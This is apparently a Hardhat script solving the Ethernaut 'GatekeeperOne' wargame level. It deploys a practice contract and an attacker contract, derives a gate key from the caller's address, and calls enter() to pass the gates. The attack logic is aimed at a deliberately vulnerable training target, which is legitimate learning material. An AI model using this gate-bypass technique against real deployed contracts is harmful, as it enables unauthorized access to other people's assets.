// We require the Hardhat Runtime Environment explicitly here. This is optional
// but useful for running the script in a standalone fashion through `node <script>`.
//
// You can also run a script with `npx hardhat run <script>`. If you do that, Hardhat
// will compile your contracts, add the Hardhat Runtime Environment's members to the
// global scope, and execute the script.
const { ethers } = require("hardhat");
const hre = require("hardhat");

async function main() {
    // Gate 2 is damn tricky. After wasting sometime, decided to pick this level later
    // const INSTANCE_ADDRESS = '0xCc71FBe0186938faF62808951215FAf1Dfa7bd22';
    const [owner, addr1] = await ethers.getSigners();

    const GatekeeperHack = await hre.ethers.getContractFactory("GatekeeperHack");
    const gatekeeperHack = await GatekeeperHack.deploy();
    await gatekeeperHack.deployed()

    const GatekeeperOne = await hre.ethers.getContractFactory("GatekeeperOne");
    const gatekeeper = await GatekeeperOne.deploy();
    await gatekeeper.deployed()

    const address = await owner.getAddress()
    const uint16TxOrigin = address.slice(-4)
    const gateKey = `0x100000000000${uint16TxOrigin}`

    const tx = await gatekeeperHack.enter(gatekeeper.address, gateKey);
    await tx.wait()

    console.log(await gatekeeper.entrant());
    
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
